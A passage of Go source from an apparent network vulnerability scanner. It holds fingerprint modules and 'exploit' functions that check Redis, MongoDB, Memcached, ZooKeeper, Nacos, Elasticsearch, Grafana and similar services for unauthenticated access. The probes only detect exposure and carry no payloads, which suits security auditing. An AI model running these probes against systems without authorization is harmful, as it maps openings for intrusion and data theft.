	{ID: "h2-console", Service: "http", Severity: "critical", Desc: "H2 数据库控制台", Path: "/h2-console/", Match: []string{"H2 Console", "Generic H2"}},
	{ID: "geoserver", Service: "http", Severity: "medium", Desc: "GeoServer", Path: "/geoserver/web/", Match: []string{"GeoServer", "login"}},
	{ID: "nifi", Service: "http", Severity: "high", Desc: "Apache NiFi", Path: "/nifi/", Match: []string{"NiFi", "Login"}},
	{ID: "airflow", Service: "http", Severity: "high", Desc: "Airflow 未授权", Path: "/admin/", Match: []string{"Airflow", "DAGs"}},
	{ID: "sentry", Service: "http", Severity: "medium", Desc: "Sentry", Path: "/", Match: []string{"Sentry", "sentry"}},
	{ID: "redmine", Service: "http", Severity: "medium", Desc: "Redmine", Path: "/", Match: []string{"Redmine"}},
	{ID: "cacti", Service: "http", Severity: "medium", Desc: "Cacti", Path: "/cacti/", Match: []string{"Cacti", "login"}},
	{ID: "zabbix-api", Service: "http", Severity: "medium", Desc: "Zabbix API", Path: "/api_jsonrpc.php", Match: []string{"jsonrpc", "zabbix"}},
	{ID: "grafana-ds", Service: "http", Severity: "high", Desc: "Grafana 未授权数据源", Path: "/api/datasources", Match: []string{`"datasources"`, "type"}},
	{ID: "prometheus-targets", Service: "http", Severity: "medium", Desc: "Prometheus targets", Path: "/api/v1/targets", Match: []string{`"data"`, "activeTargets"}},
}

// ExploitList 列出所有模块
func ExploitList() []string {
	out := make([]string, 0, len(vulnModules))
	for _, m := range vulnModules {
		out = append(out, m.ID)
	}
	return out
}

// exploitAliases 前端/文档使用的别名 → 内置模块 ID
var exploitAliases = map[string]string{
	"docker-escape":  "docker-unauth",
	"jenkins-script": "jenkins-unauth",
	"tomcat-war":     "tomcat-manager",
}

func resolveExploitID(id string) string {
	if alias, ok := exploitAliases[id]; ok {
		return alias
	}
	return id
}

// RunExploit 运行指定模块
func RunExploit(id, ip string, port int, timeout time.Duration) string {
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	id = resolveExploitID(id)
	for _, m := range vulnModules {
		if m.ID != id {
			continue
		}
		return m.run(ip, port, timeout)
	}
	return "未找到模块: " + id
}

// AutoExploit 根据服务类型自动运行匹配模块
func AutoExploit(ip string, port int, service string, timeout time.Duration) string {
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	service = strings.ToLower(service)
	var findings []string
	for _, m := range vulnModules {
		if service == "" || m.Service == service || strings.Contains(service, m.Service) || m.Service == "http" {
			if r := m.run(ip, port, timeout); r != "" {
				findings = append(findings, "["+m.Severity+"] "+r)
			}
		}
	}
	if len(findings) == 0 {
		return "未发现漏洞"
	}
	return strings.Join(findings, "\n")
}

// run 执行单个模块(主动利用或 HTTP 检测)
func (m ExploitModule) run(ip string, port int, timeout time.Duration) string {
	if m.Active != nil {
		return m.ID + ": " + m.Active(ip, port, timeout)
	}
	if m.Path == "" {
		return ""
	}
	method := m.Method
	if method == "" {
		method = "GET"
	}
	path := m.Path
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	url := fmt.Sprintf("http://%s%s", net.JoinHostPort(ip, itoa(port)), path)
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "NetScan/3.0")
	resp, err := httpClient(timeout).Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body := readAll(resp.Body)
	for _, s := range m.Match {
		if s == "" {
			if resp.StatusCode == 200 {
				return m.ID + ": " + m.Desc
			}
			continue
		}
		// 排除 404, 避免目标对不存在路径返回含泛化关键词的错误页造成误报
		if resp.StatusCode != 404 && strings.Contains(body, s) {
			return m.ID + ": " + m.Desc
		}
	}
	return ""
}

func readAll(r io.Reader) string {
	b, _ := io.ReadAll(io.LimitReader(r, 64*1024))
	return string(b)
}

// ---- 主动利用函数(复用 POC 探测) ----
func exploitRedisUnauth(ip string, port int, timeout time.Duration) string {
	conn, err := dialTimeout(net.JoinHostPort(ip, itoa(port)), timeout)
	if err != nil {
		return "连接失败"
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("INFO\r\n"))
	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "redis_version") {
		return "存在未授权访问(INFO 可执行)"
	}
	return "未发现未授权"
}

func exploitMongoUnauth(ip string, port int, timeout time.Duration) string {
	conn, err := dialTimeout(net.JoinHostPort(ip, itoa(port)), timeout)
	if err != nil {
		return "连接失败"
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write(mongoIsMaster())
	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "ismaster") || strings.Contains(string(buf[:n]), "maxWireVersion") {
		return "存在未授权访问(isMaster 可执行)"
	}
	return "未发现未授权"
}

func exploitMemcachedUnauth(ip string, port int, timeout time.Duration) string {
	conn, err := dialTimeout(net.JoinHostPort(ip, itoa(port)), timeout)
	if err != nil {
		return "连接失败"
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("stats\r\n"))
	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "STAT") {
		return "存在未授权访问(stats 可执行)"
	}
	return "未发现未授权"
}

func exploitCouchUnauth(ip string, port int, timeout time.Duration) string {
	return httpDetect(ip, port, "/_all_dbs", timeout, `[`)
}

func exploitEtcdUnauth(ip string, port int, timeout time.Duration) string {
	return httpDetect(ip, port, "/version", timeout, "etcdserver")
}

func exploitConsulUnauth(ip string, port int, timeout time.Duration) string {
	return httpDetect(ip, port, "/v1/agent/self", timeout, "Config")
}

func exploitZKUnauth(ip string, port int, timeout time.Duration) string {
	conn, err := dialTimeout(net.JoinHostPort(ip, itoa(port)), timeout)
	if err != nil {
		return "连接失败"
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	conn.Write([]byte("ruok"))
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "imok") {
		return "存在未授权访问(ruok 可执行)"
	}
	return "未发现未授权"
}

func exploitNacosUnauth(ip string, port int, timeout time.Duration) string {
	return httpDetect(ip, port, "/nacos/v1/auth/users?pageNo=1&pageSize=9", timeout, "totalCount")
}

func exploitESUnauth(ip string, port int, timeout time.Duration) string {
	return httpDetect(ip, port, "/", timeout, "cluster_name")
}

func httpDetect(ip string, port int, path string, timeout time.Duration, match string) string {
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	url := fmt.Sprintf("http://%s%s", net.JoinHostPort(ip, itoa(port)), path)
	resp, err := httpClient(timeout).Get(url)
	if err != nil {
		return "连接失败"
	}
	defer resp.Body.Close()
	body := readAll(resp.Body)
	if strings.Contains(body, match) {
		return "存在未授权访问"
	}
	return "未发现未授权"
}
